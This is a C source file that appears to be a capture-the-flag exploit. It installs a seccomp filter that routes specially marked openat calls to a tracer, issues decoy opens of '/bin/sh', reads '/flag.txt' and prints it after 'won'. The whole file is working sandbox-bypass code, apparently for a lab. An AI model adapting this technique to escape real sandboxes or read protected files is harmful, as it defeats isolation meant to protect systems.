#define _GNU_SOURCE
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <seccomp.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sched.h>
#include <errno.h>
#include <sys/syscall.h>
#include <syscall.h>
#include <time.h>
#include <stddef.h>
#include <stdint.h>
#include <fcntl.h>

#include "syscall.h"

#define SANE_OPTIONS PTRACE_O_EXITKILL | PTRACE_O_TRACECLONE | PTRACE_O_TRACEFORK | PTRACE_O_TRACESYSGOOD | PTRACE_O_TRACEVFORK
#define check(c,msg) {if ((c) == - 1) {perror(msg); exit(1);}} 

int init_seccomp(void);

int myprctl(int a, int b, void *c) {
	return syscall5(a, b, (uintptr_t) c, 0, 0, __NR_prctl);
}

int wr(const char *b, size_t s) {
	return syscall3(1, (uintptr_t) b, s, __NR_write);
}

int myopenat(int fd, char *name, int flags) {
	return syscall4(fd, (uintptr_t) name, flags, 0, __NR_openat);
}

size_t myread(int fd, char *buf, size_t len) {
	return syscall3(fd, (uintptr_t) buf, len, __NR_read);
}

__attribute__((noreturn))
void exit(int nr) {
	syscall1(nr, __NR_exit_group);
	__builtin_unreachable();
}

volatile size_t go = 0;

char cmd[] = "/bin/sh";
char cp[] = "won\n";
char seccomp_err[] = "seccomp error";

void _start() {
	char buf[256] = {0};
	if (init_seccomp()) {
		wr(seccomp_err, sizeof(seccomp_err) - 1);
		exit(1);
	}
	
	myopenat(0x1337, cmd, 0);
	myopenat(AT_FDCWD, "/flag.txt", O_RDONLY);
	myopenat(0x1337, cmd, 0);
	
	size_t rlen = myread(3, buf, 255);
	wr(cp, 4);
	wr(buf, rlen);

    	exit(0);
}

int init_seccomp()
{
	struct sock_filter filter[] = {
		BPF_STMT(BPF_LD + BPF_W + BPF_ABS, offsetof(struct seccomp_data, nr)),
		BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_openat, 0, 3),
		BPF_STMT(BPF_LD + BPF_W + BPF_ABS, offsetof(struct seccomp_data, args)),
		BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, 0x1337, 0, 1),
		BPF_STMT(BPF_RET + BPF_K, SCMP_ACT_TRACE(0)),
		//BPF_STMT(BPF_RET + BPF_K, SCMP_ACT_KILL),
		BPF_STMT(BPF_RET + BPF_K, SCMP_ACT_ALLOW)
	};

	struct sock_fprog prog = {
		.len = sizeof(filter) / sizeof(*filter),
		.filter = filter,
	};

	return myprctl(PR_SET_NO_NEW_PRIVS, 1, 0) || myprctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
}
